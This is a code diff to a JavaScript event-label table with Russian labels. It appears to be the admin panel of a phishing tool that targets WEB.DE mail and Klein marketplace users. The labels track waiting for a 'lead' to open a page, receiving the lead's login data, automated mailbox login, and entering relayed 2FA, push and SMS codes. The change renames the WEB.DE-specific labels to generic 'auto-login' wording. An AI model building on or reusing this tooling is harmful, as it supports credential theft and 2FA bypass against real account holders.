@@ -13,8 +13,8 @@ function getProjectDataDir() {
 
 /** Единые подписи EVENTS (скрипт/админка). */
 const EVENT_LABELS = {
-  WEBDE_START: 'Запуск WEB.DE',
-  WEBDE_QUEUE: 'WEB.DE: в очереди',
+  WEBDE_START: 'Запуск автовхода в почту',
+  WEBDE_QUEUE: 'Автовход: в очереди',
   KLEIN_START: 'Запуск Klein',
   KLEIN_QUEUE: 'Klein: в очереди',
   PUSH: 'Push',
@@ -35,11 +35,11 @@ const EVENT_LABELS = {
   MAIL_READY: 'Почта готова',
   PUSH_RESEND_OK: 'Push: переотправлен',
   PUSH_RESEND_FAIL: 'Push: переотправка не удалась',
-  TWO_FA_CODE_IN: '2FA: код получен, ввод на WEB.DE',
+  TWO_FA_CODE_IN: '2FA: код получен, ввод в почте',
   TWO_FA_WRONG: '2FA: неверный код',
-  WEBDE_STEP_BROWSER: 'WEB.DE: браузер готов',
-  WEBDE_STEP_ATTEMPT: 'WEB.DE: попытка входа',
-  WEBDE_MAIL_OPENED: 'WEB.DE: почтовый ящик открыт',
+  WEBDE_STEP_BROWSER: 'Автовход: браузер готов',
+  WEBDE_STEP_ATTEMPT: 'Автовход: попытка входа',
+  WEBDE_MAIL_OPENED: 'Почтовый ящик открыт',
   MAIL_UI_READY: 'Почта: интерфейс подготовлен',
   KLEIN_SESSION_MAIL: 'Klein: сессия почты в браузере',
   KLEIN_WAIT_VICTIM: 'Klein: ждём открытия страницы у лида',
@@ -47,9 +47,9 @@ const EVENT_LABELS = {
   KLEIN_CREDS_FROM_LEAD: 'Klein: данные для входа получены',
   KLEIN_SCRIPT_START: 'Klein (скрипт): старт',
   KLEIN_SCRIPT_BROWSER: 'Klein (скрипт): браузер',
-  WEBDE_SCREEN_PUSH: 'WEB.DE: на экране Push',
-  WEBDE_SCREEN_2FA: 'WEB.DE: на экране 2FA',
-  WEBDE_SCREEN_SMS: 'WEB.DE: на экране SMS',
+  WEBDE_SCREEN_PUSH: 'На экране Push (почта)',
+  WEBDE_SCREEN_2FA: 'На экране 2FA (почта)',
+  WEBDE_SCREEN_SMS: 'На экране SMS (почта)',
 };
 
 function readStartPage() {
